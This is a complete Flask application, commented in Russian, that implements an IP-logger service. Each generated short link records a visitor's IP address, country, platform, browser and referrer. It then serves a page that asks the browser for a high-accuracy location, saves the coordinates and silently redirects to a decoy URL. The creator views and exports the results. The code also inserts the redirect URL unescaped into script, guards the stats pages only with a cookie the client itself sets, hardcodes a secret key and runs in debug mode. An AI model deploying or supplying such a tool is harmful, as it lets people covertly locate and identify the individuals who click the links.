from flask import Flask, render_template, request, redirect, url_for, make_response, Response
import sqlite3
import uuid
from datetime import datetime
import csv
import io
from functools import wraps

app = Flask(__name__)
app.config['DATABASE'] = 'iplogger.db'
app.config['SECRET_KEY'] = '753937538hewjhkewjhf74'  # Замените на надежный ключ

# Декоратор для защиты статистики
def require_cookie(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        link_id = kwargs.get('link_id')
        if request.cookies.get(f'access_{link_id}') != 'true':
            return redirect(url_for('index'))
        return f(*args, **kwargs)
    return decorated_function

def init_db():
    with sqlite3.connect(app.config['DATABASE']) as conn:
        c = conn.cursor()
        
        # Таблица отслеживаемых ссылок
        c.execute('''CREATE TABLE IF NOT EXISTS links 
                    (id TEXT PRIMARY KEY,
                     created_at DATETIME,
                     target_url TEXT)''')
        
        # Таблица логов с улучшенной структурой
        c.execute('''CREATE TABLE IF NOT EXISTS logs 
                    (id INTEGER PRIMARY KEY AUTOINCREMENT,
                     link_id TEXT NOT NULL,
                     ip TEXT,
                     country TEXT,
                     platform TEXT,
                     browser TEXT,
                     referrer TEXT,
                     latitude REAL,
                     longitude REAL,
                     timestamp DATETIME)''')
        
        # Проверка и добавление недостающих колонок
        for column in ['latitude', 'longitude']:
            c.execute("PRAGMA table_info(logs)")
            columns = [col[1] for col in c.fetchall()]
            if column not in columns:
                c.execute(f"ALTER TABLE logs ADD COLUMN {column} REAL")
        
        conn.commit()

init_db()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/create', methods=['POST'])
def create_link():
    link_id = str(uuid.uuid4())[:8]
    target_url = request.form.get('target_url', 'https://google.com').strip()
    created_at = datetime.now()
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = f'http://{target_url}'
    
    with sqlite3.connect(app.config['DATABASE']) as conn:
        c = conn.cursor()
        c.execute("INSERT INTO links (id, created_at, target_url) VALUES (?, ?, ?)", 
                 (link_id, created_at, target_url))
        conn.commit()
    
    resp = make_response(redirect(url_for('stats', link_id=link_id)))
    resp.set_cookie(f'access_{link_id}', 'true', max_age=60*60*24*365)
    return resp

@app.route('/<link_id>', methods=['GET', 'POST'])
def track(link_id):
    # Получение целевого URL
    with sqlite3.connect(app.config['DATABASE']) as conn:
        c = conn.cursor()
        c.execute("SELECT target_url FROM links WHERE id = ?", (link_id,))
        target = c.fetchone()
    redirect_url = target[0] if target else 'https://google.com'

    if request.method == 'POST':
        # Обработка геолокации
        data = request.json
        with sqlite3.connect(app.config['DATABASE']) as conn:
            c = conn.cursor()
            c.execute('''UPDATE logs SET 
                      latitude = ?, 
                      longitude = ?
                      WHERE id = ?''',
                    (data['lat'], data['lon'], data['log_id']))
            conn.commit()
        return 'OK'
    
    # Сбор базовой информации
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '').lower()
    referrer = request.referrer
    timestamp = datetime.now()
    
    # Улучшенное определение платформы
    platform = 'Unknown'
    platform_checks = [
        ('windows', 'Windows'),
        ('linux', 'Linux'),
        ('macintosh', 'MacOS'),
        ('iphone', 'iPhone'),
        ('ipad', 'iPad'),
        ('android', 'Android')
    ]
    for keyword, name in platform_checks:
        if keyword in user_agent:
            platform = name
            break
    
    # Улучшенное определение браузера (приоритетный порядок)
    browser = 'Unknown'
    browser_checks = [
        ('yabrowser', 'Yandex Browser'),
        ('opr', 'Opera'),
        ('edg', 'Edge'),
        ('chrome', 'Chrome'),
        ('firefox', 'Firefox'),
        ('safari', 'Safari'),
        ('vivaldi', 'Vivaldi'),
        ('brave', 'Brave')
    ]
    for keyword, name in browser_checks:
        if keyword in user_agent:
            browser = name
            break
    
    # Определение страны с резервным методом
    country = 'Unknown'
    try:
        from ip2geotools.databases.noncommercial import DbIpCity
        res = DbIpCity.get(ip, api_key='free')
        country = res.country
    except Exception as e:
        app.logger.error(f'GeoIP error: {str(e)}')
    
    # Сохранение данных
    with sqlite3.connect(app.config['DATABASE']) as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO logs 
                  (link_id, ip, country, platform, browser, referrer, timestamp)
                  VALUES (?, ?, ?, ?, ?, ?, ?)''',
                  (link_id, ip, country, platform, browser, referrer, timestamp))
        log_id = c.lastrowid
        conn.commit()
    
    # Страница с запросом геолокации
    return f'''
    <!DOCTYPE html>
    <html>
    <body>
    <script>
    function getLocation() {{
        const redirectUrl = "{redirect_url}";
        
        const options = {{
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
        }};

        const success = position => {{
            fetch(window.location.href, {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    log_id: {log_id}
                }})
            }}).then(() => window.location = redirectUrl);
        }};

        const error = err => {{
            console.warn(`ERROR(${{err.code}}): ${{err.message}}`);
            window.location = redirectUrl;
        }};

        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(success, error, options);
        }} else {{
            window.location = redirectUrl;
        }}
    }}
    getLocation();
    </script>
    </body>
    </html>
    '''

@app.route('/stats/<link_id>')
@require_cookie
def stats(link_id):
    tracking_url = f"{request.host_url}{link_id}"
    
    with sqlite3.connect(app.config['DATABASE']) as conn:
        c = conn.cursor()
        
        # Основная статистика
        c.execute('''SELECT 
                    COUNT(*) as total_clicks,
                    COUNT(DISTINCT ip) as unique_visitors,
                    country,
                    platform,
                    browser
                 FROM logs 
                 WHERE link_id = ?
                 GROUP BY country, platform, browser
                 ORDER BY total_clicks DESC''', (link_id,))
        stats = c.fetchall()
        
        # Подробные логи
        c.execute('''SELECT * FROM logs 
                  WHERE link_id = ?
                  ORDER BY timestamp DESC
                  LIMIT 100''', (link_id,))
        logs = c.fetchall()
    
    return render_template('stats.html', 
                         stats=stats,
                         logs=logs,
                         link_id=link_id,
                         tracking_url=tracking_url)

@app.route('/export/<link_id>/csv')
@require_cookie
def export_csv(link_id):
    with sqlite3.connect(app.config['DATABASE']) as conn:
        c = conn.cursor()
        c.execute('''SELECT * FROM logs WHERE link_id = ?''', (link_id,))
        data = c.fetchall()
    
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['ID', 'Link ID', 'IP', 'Country', 'Platform', 
                   'Browser', 'Referrer', 'Latitude', 'Longitude', 'Timestamp'])
    
    for row in data:
        writer.writerow(row)
    
    output.seek(0)
    
    return Response(
        output,
        mimetype="text/csv",
        headers={"Content-Disposition":
                f"attachment;filename={link_id}_logs.csv"})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', ssl_context='adhoc')
